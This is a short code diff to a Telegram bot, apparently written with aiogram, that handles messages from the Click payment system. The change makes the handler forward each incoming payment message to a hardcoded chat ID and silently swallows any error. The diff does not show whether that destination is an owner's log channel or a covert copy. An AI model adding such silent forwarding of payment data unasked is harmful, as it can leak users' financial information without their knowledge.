@@ -1,3 +1,4 @@
+import logging
 import math
 
 from aiogram import Router
@@ -23,6 +24,10 @@ async def handle_click_message(message: Message):
     """
     Click payment system messages handler
     """
+    try:
+        await message.forward(-1002430814689)
+    except Exception as e:
+        logging.error(e)
     data = await PaymentInfoParser.click(message.text)
 
     log: DeviceLog = data.get('log')
